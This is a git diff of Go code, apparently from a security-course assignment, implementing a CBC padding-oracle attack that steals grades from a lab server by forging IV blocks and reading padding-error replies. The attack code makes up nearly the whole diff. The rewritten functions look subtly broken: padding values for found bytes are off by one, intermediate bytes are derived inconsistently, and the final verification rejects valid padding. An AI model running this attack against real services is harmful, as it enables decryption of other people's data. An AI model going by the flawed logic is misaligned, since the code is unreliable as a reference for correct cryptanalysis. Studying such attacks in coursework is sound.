@@ -62,7 +62,7 @@ func stealGrades(conn *conn, studentId string) {
 	}
 
 	// Strip the trailer from the decrypted plaintext response.
-	fmt.Printf("GOING TO REMOVE TRAILER\n")
+	fmt.Printf("GOING TO REMOVE TRAILER")
 	grades, err := removeTrailer(concatBlocks(ptext...))
 	if err != nil {
 		log.Fatalf("could not remove trailer: %v", err)
@@ -74,8 +74,14 @@ func stealGrades(conn *conn, studentId string) {
 // Encrypts the plaintext, assuming the trailer has already been added.
 //
 // Returns the IV and all ciphertext blocks.
+
+// func encryptPlaintext(conn *conn, ptext []block) (block, []block, error) {
+// 	return block{}, nil, errors.New("unimplemented")
+// }
+
 func encryptPlaintext(conn *conn, ptext []block) (block, []block, error) {
-	var iv block // generate random IV block
+	// Generate a random IV for the encryption.
+	var iv block
 	if _, err := io.ReadFull(rand.Reader, iv.bytes[:]); err != nil {
 		return block{}, nil, fmt.Errorf("failed to generate IV: %v", err)
 	}
@@ -102,35 +108,43 @@ func encryptPlaintext(conn *conn, ptext []block) (block, []block, error) {
 //
 // Note that this should *not* result in the server believing that a valid
 // command has been sent. That's for `stealGrades` to do!
+//
+//	func decryptCiphertext(conn *conn, iv block, ctext []block) ([]block, error) {
+//		return nil, errors.New("unimplemented")
+//	}
 func decryptCiphertext(conn *conn, iv block, ctext []block) ([]block, error) {
-	var decryptedText []block
+	// Check if there's anything to decrypt
+	if len(ctext) == 0 {
+		return nil, errors.New("ciphertext cannot be empty")
+	}
 
+	// Prepare a slice to hold the decrypted blocks
+	decryptedBlocks := make([]block, len(ctext))
+
+	// Iterate over each block in the ciphertext
 	for i, cblock := range ctext {
-		fmt.Println("GOING TO DECRYPT CIPHER BLOCK NOW: ")
-
-		decryptedBlock, err := decryptCiphertextBlock(conn, cblock)
+		// Decrypt each block to get its intermediate state
+		intermediateState, err := decryptCiphertextBlock(conn, cblock)
 		if err != nil {
-			return nil, fmt.Errorf("failed to decrypt block %d: %v", i, err)
+			return nil, fmt.Errorf("failed to decrypt block at index %d: %v", i, err)
 		}
-		fmt.Printf("DECRYPTED THE CIPHER BLOCK")
 
-		decryptedText = append(decryptedText, decryptedBlock) // append the decrypred (Intermediate state) block to the slice
-	}
-
-	var plaintext []block
-	for i, intermediateStateBlock := range decryptedText { // go though the slice and XOR each entry with the previous cipher text block or IV
-		var plaintextBlock block
+		// The IV for the first block is the IV passed to the function,
+		// and for subsequent blocks, it's the previous block in the ciphertext
+		var prevBlock block
 		if i == 0 {
-
-			plaintextBlock = xorBlocks(intermediateStateBlock, iv) // XOR the first block's intermediate state with the IV
+			prevBlock = iv
 		} else {
-
-			plaintextBlock = xorBlocks(intermediateStateBlock, ctext[i-1]) // XOR others with previous ciphertext blocks
+			prevBlock = ctext[i-1]
 		}
-		plaintext = append(plaintext, plaintextBlock)
+
+		// XOR the intermediate state with the previous block (or IV for the first block) to get the plaintext
+		for j := range prevBlock.bytes {
+			decryptedBlocks[i].bytes[j] = intermediateState.bytes[j] ^ prevBlock.bytes[j]
+		}
 	}
 
-	return plaintext, nil
+	return decryptedBlocks, nil
 }
 
 // Reverse-engineers the decryption of `cblock`. Returns a plaintext block which
@@ -141,56 +155,60 @@ func decryptCiphertext(conn *conn, iv block, ctext []block) ([]block, error) {
 // cipher mode. In other words, this is the input to encryption *after* XOR'ing,
 // or equivalently, the output of decryption *before* XOR'ing (otherwise known
 // as the "intermediate state").
-
 func decryptCiphertextBlock(conn *conn, cblock block) (block, error) {
 	var intermediateState block
-	var tempCblock block
-	var count int
+	var simulatedIV block // Represents the manipulated IV or previous ciphertext block effect.
 
-	// Decrypt each byte of the block starting from the last one
-	for i := 15; i >= 0; i-- {
-		paddingByte := byte(16 - i) // get the padding byte based on waht index we are on
+	// Iterating through each byte in the block from the end to the start.
+	for byteIndex := 15; byteIndex >= 0; byteIndex-- {
+		found := false
+		paddingValue := byte(16 - byteIndex) // The padding value we aim to simulate for this byte.
+
+		// Trying each possible value for the current byte.
 		for guess := 0; guess < 256; guess++ {
-			tempCblock.bytes[i] = byte(guess) // put guess into the block
-			_, errResponseBlocks, _ := sendCommand(conn, tempCblock, []block{cblock})
-			fmt.Printf("THIS IS THE LEN OF THE SEND RESPONSE BLOCKS %d \n", len(errResponseBlocks))
-			if len(errResponseBlocks) != 1 { // check for non padding errors
-				fmt.Printf("I GOT A GOOD ERROR\n")
-				count += 1
-				intermediateState.bytes[i] = byte(guess) ^ paddingByte // good error indiciates the Is byte was found
-				for j := i; j < 16; j++ {                              //move to the next byte position.
-					tempCblock.bytes[j] = intermediateState.bytes[j] ^ byte(16-i+1)
-				}
+			// Prepare the simulatedIV for this guess.
+			simulatedIV.bytes[byteIndex] = byte(guess) ^ paddingValue
+
+			// Adjust the simulatedIV for already discovered bytes to maintain correct padding.
+			for i := byteIndex + 1; i < 16; i++ {
+				// For already discovered bytes, adjust the simulated IV to reflect the new padding value
+				// This ensures the server sees the expected padding pattern when verifying the block
+				simulatedIV.bytes[i] = intermediateState.bytes[i] ^ byte(16-byteIndex+1)
+			}
+
+			_, responseBlocks, _ := sendCommand(conn, simulatedIV, []block{cblock})
+			if len(responseBlocks) > 1 {
+				// Found the correct intermediate state byte for this position.
+				intermediateState.bytes[byteIndex] = byte(guess) ^ paddingValue
+				found = true
 				break
-			} else {
-				fmt.Println("GOT PADDING ERROR WILL TRY NEXT GUESS\n")
 			}
 		}
-	}
-	fmt.Println("THIS IS COUNT\n", count)
 
-	// If my count gets to 16 then how did I not correctly guess everything then?
-
-	// Verification of the entire intermediate state.
-	fmt.Println("GOING TO VERIFY NOW: ")
-	for i := 15; i >= 0; i-- {
-		// Set the current byte and all following bytes to create a valid padding pattern for verification.
-		for j := i; j < 16; j++ {
-			// The bytes are set to produce a padding pattern of the form 01, 02 02, ..., 10 10 10 ... 10
-			tempCblock.bytes[j] = intermediateState.bytes[j] ^ byte(16-i) // need to produce a padding pattern of  01, 02 02, ..., 10 10 10 ... 10
+		if !found {
+			return block{}, fmt.Errorf("failed to find intermediate state for byte index %d", byteIndex)
 		}
-		// Send the verification block to the server.
-		_, responseBlocks, _ := sendCommand(conn, tempCblock, []block{cblock})
-		fmt.Println("THIS IS THE LENGTH OF THE RESPONSE BLOCKS FOR VERIFICATION: %d INDEX AT: %d", len(responseBlocks), i)
-		if len(responseBlocks) == 1 {
-			fmt.Println("GOT A PADDING ERROR WHILE VERIFYING\n")
-			// If the server responds with a padding error, the intermediate state is incorrect.
-			return block{}, errors.New("COULD NOT VERIFY LOLZ")
-		}
-		// If no padding error, continue to verify the next byte.
 	}
-	fmt.Println("VERIFIED FULLY WITH NO PADDING ERROR\n")
 
+	// Final verification: Ensure the entire block, with discovered intermediate state, results in correct padding.
+	for i := 0; i < 16; i++ {
+		// For final verification, set the simulated IV to produce a block with padding 0x01 through 0x10.
+		paddingValue := byte(16 - i)
+		for j := 0; j < 16; j++ {
+			if j >= i {
+				// Adjust the simulated IV to simulate correct padding for verification.
+				simulatedIV.bytes[j] = intermediateState.bytes[j] ^ paddingValue
+			}
+		}
+
+		_, responseBlocks, _ := sendCommand(conn, simulatedIV, []block{cblock})
+		// Expect a single block response indicating correct padding; otherwise, the padding is incorrect.
+		if len(responseBlocks) > 1 {
+			return block{}, fmt.Errorf("final padding verification failed for byte index %d", i)
+		}
+	}
+
+	// If all bytes pass the final verification, the intermediate state is correctly determined.
 	return intermediateState, nil
 }
 
